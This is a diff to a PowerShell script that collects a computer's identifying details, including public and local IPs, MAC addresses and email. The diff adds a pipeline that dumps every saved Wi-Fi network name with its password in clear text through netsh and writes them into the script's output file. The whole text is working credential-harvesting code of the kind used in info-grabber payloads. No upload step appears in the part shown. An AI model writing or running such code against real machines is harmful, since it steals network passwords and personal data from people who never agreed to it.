@@ -57,7 +57,8 @@ $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamil
 $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String
 
 #------------------------------------------------------------------------------------------------------------------------------------
-
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  
+| Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 #------------------------------------------------------------------------------------------------------------------------------------
 
 $output = @"
@@ -107,13 +108,14 @@ Email: $email
 ------------------------------------------------------------------------------------------------------------------------------
 Public IP: 
 $computerPubIP
-https://ipgeolocation.io/ip-location/$computerPubIP
 
 Local IPs:
 $localIP
 MAC:
 $MAC
 
+NETWORKS:
+$wifiProfiles
 "@
 
 $output > $FileName
